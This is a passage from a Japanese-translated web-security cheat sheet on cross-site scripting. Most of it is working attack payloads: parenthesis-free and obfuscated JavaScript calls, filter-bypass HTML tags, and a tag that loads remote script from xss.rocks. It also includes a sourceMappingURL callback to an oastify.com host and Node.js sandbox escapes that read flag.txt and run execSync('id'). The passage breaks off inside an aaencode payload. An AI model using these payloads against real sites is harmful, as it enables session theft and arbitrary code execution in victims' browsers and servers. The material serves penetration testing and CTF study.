//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript（括弧なし）**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**任意の関数 (alert) 呼び出し**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

There is **JS code** that is using **unsafely data controlled by an attacker** like `location.href` . An attacker, could abuse this to execute arbitrary JS code.\
**Due to the extension of the explanation of** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

そこには **DOM vulnerabilities が何か、どのように発生するか、そしてどのように悪用するか** の詳細な説明があります。\
また、**該当記事の最後** に [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering) に関する説明があることを忘れないでください。

### Self-XSS のエスカレーション

### Cookie XSS

If you can trigger a XSS by sending the payload inside a cookie, this is usually a self-XSS. However, if you find a **vulnerable subdomain to XSS**, you could abuse this XSS to inject a cookie in the whole domain managing to trigger the cookie XSS in the main domain or other subdomains (the ones vulnerable to cookie XSS). For this you can use the cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

You can find a great abuse of this technique in [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### 管理者にセッションを送る

ユーザが自分のprofileをadminと共有できる場合、profile内にself XSSがありadminがそれを閲覧すると、admin側で脆弱性がトリガーされます。

### Session Mirroring

If you find some self XSS and the web page have a **session mirroring for administrators**, for example allowing clients to ask for help an in order for the admin to help you he will be seeing what you are seeing in your session but from his session.

管理者がクライアントのセッションをミラーリングして見る機能がある場合（例えばサポートのためにクライアントが助けを求め、その際にadminがクライアントの画面を自分のセッションから見るような場合）、管理者にあなたのself XSSを発動させてそのcookies/sessionを盗むことが可能です。

## Other Bypasses

### WASM linear-memory template overwrite を介したサニタイズのバイパス

When a web app uses Emscripten/WASM, constant strings (like HTML format stubs) live in writable linear memory. A single in‑WASM overflow (e.g., unchecked memcpy in an edit path) can corrupt adjacent structures and redirect writes to those constants. Overwriting a template such as "<article><p>%.*s</p></article>" to "<img src=1 onerror=%.*s>" turns sanitized input into a JavaScript handler value and yields immediate DOM XSS on render.

専用ページにて、exploitation workflow、DevTools のメモリヘルパ、及び防御策を解説しています：

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

You could check is the **reflected values** are being **unicode normalized** in the server (or in the client side) and abuse this functionality to bypass protections. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

**RoR mass assignment**のため、HTMLに引用符が挿入され、引用符による制約がバイパスされ、タグ内に追加のフィールド（onfocus）を挿入できます。\
フォームの例（[from this report](https://hackerone.com/reports/709336)）、payloadを送信すると:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
ペア "Key","Value" は次のように返されます:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
すると、onfocus 属性が挿入され、XSS が発生します。

### 特殊な組み合わせ
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### 302 レスポンスでのヘッダ注入を伴う XSS

もし **302 Redirect response にヘッダを注入できる** なら、**ブラウザに任意の JavaScript を実行させる** ことを試せます。これは **簡単ではありません**。モダンブラウザは HTTP レスポンスのステータスコードが 302 の場合、HTTP レスポンスボディを解釈しないため、単純な cross-site scripting ペイロードは無効です。

[**this report**](https://www.gremwell.com/firefox-xss-302) および [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) では、Location header 内でいくつかのプロトコルを試し、どれがブラウザにボディ内の XSS ペイロードを検査・実行させるかを確認する方法が説明されています。\
過去に知られているプロトコル: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Only Letters, Numbers and Dots

もし JavaScript が実行する **callback** をこれらの文字に制限して指定できる場合は、その挙動を悪用する方法があります。[**Read this section of this post**](#javascript-function) を参照してください。

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) If you try to load a script with a **content-type** such as `application/octet-stream`, Chrome will throw following error:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

The only **Content-Type**s that will support Chrome to run a **loaded script** are the ones inside the const **`kSupportedJavascriptTypes`** from [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### XSSにおけるスクリプトの種類

(出典: [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) では、スクリプトを読み込むためにどのタイプが指定できますか？
```html
<script type="???"></script>
```
答えは:

- **module** (デフォルト、説明不要)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundlesは、HTML、CSS、JS…などのデータをまとめて**`.wbn`**ファイルとしてパッケージできる機能です。
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** インポート構文を改善できます
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
この挙動は [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) で、ライブラリをevalにリマップして悪用し、XSSを引き起こすために使用されました。

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** この機能は主にプリレンダリングが原因で発生するいくつかの問題を解決するためのもので、動作は次のとおりです:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types による XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) 次の Content-Types はすべてのブラウザで XSS を実行できます:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? not in the list but I think I saw this in a CTF)
- application/rss+xml (off)
- application/atom+xml (off)

他のブラウザでは、他の **`Content-Types`** を使って任意の JS を実行できる場合があります。詳しくは: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml コンテンツタイプ

ページが text/xml コンテンツタイプを返す場合、名前空間を指定して任意の JS を実行することが可能です:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### 特殊な置換パターン

次のようなコードが使用される場合、**`"some {{template}} data".replace("{{template}}", <user_input>)`**。攻撃者は[**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement)を利用していくつかの保護を回避しようとする可能性があります： `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

例えば[**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA)では、これがスクリプト内のJSON文字列をエスケープして任意のコードを実行するために使われました。

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

使用できる文字が限られている場合、XSJailの問題に対する以下の他の有効な解法を確認してください：
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
信頼できないコードを実行する前に**everything is undefined**な状態であれば（[**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)のように）、任意の信頼できないコードの実行を悪用するために「何もないところから」有用なオブジェクトを生成することが可能です：

- import() を使用する
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- `require` に間接的にアクセスする

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) モジュールは Node.js によって関数内でラップされ、次のようになります:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
したがって、そのモジュールから**別の関数を呼び出す**ことができれば、その関数内から `arguments.callee.caller.arguments[1]` を使って **`require`** にアクセスすることができます：
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
前の例と同様に、**use error handlers**を利用してモジュールの**wrapper**にアクセスし、**`require`**関数を取得することができます:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **同一ページ内の obfuscations:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- より高度な JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
